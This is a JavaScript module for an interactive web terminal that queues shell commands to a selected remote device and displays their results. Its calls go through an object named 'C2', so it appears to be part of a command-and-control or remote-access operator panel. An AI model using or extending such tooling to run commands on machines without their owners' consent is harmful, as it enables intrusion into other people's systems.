/* Interactive shell terminal for a selected device. */

const Terminal = (() => {
  let out, input, sendBtn;
  let currentDeviceId = null;
  let history = [];
  let histIdx = -1;

  function mount() {
    out = document.getElementById("terminal-out");
    input = document.getElementById("terminal-cmd");
    sendBtn = document.getElementById("terminal-send");
    if (!out || !input || !sendBtn) return;

    sendBtn.addEventListener("click", submit);
    input.addEventListener("keydown", e => {
      if (e.key === "Enter") submit();
      else if (e.key === "ArrowUp") {
        e.preventDefault();
        if (histIdx < history.length - 1) histIdx++;
        input.value = history[history.length - 1 - histIdx] || "";
      } else if (e.key === "ArrowDown") {
        e.preventDefault();
        if (histIdx > 0) histIdx--;
        else { histIdx = -1; input.value = ""; return; }
        input.value = history[history.length - 1 - histIdx] || "";
      }
    });
  }

  function setDevice(id) { currentDeviceId = id; }

  function write(text, cls = "out") {
    if (!out) return;
    const div = document.createElement("div");
    div.className = `line ${cls}`;
    div.textContent = text;
    out.appendChild(div);
    out.scrollTop = out.scrollHeight;
  }

  async function submit() {
    const cmd = input.value.trim();
    if (!cmd || !currentDeviceId) return;
    history.push(cmd);
    histIdx = -1;
    write(`$ ${cmd}`, "in");
    input.value = "";
    try {
      const cmdRow = await C2.apiJson(`/api/device/${currentDeviceId}/command`, {
        method: "POST",
        body: JSON.stringify({ type: "shell", args: { cmd } })
      });
      write(`[task #${cmdRow.id}] queued`, "out");
    } catch (err) {
      write(`error: ${err}`, "err");
    }
  }

  function onResult(cmdRow) {
    if (cmdRow.command_type !== "shell") return;
    let res;
    try { res = JSON.parse(cmdRow.result || "{}"); }
    catch (_) { res = { output: cmdRow.result }; }
    const status = cmdRow.status === "done" ? "out" : "err";
    const text = res.stdout || res.error || res.output || "(no output)";
    write(`[#${cmdRow.id}] ${text}`, status);
  }

  return { mount, setDevice, write, onResult };
})();

window.Terminal = Terminal;
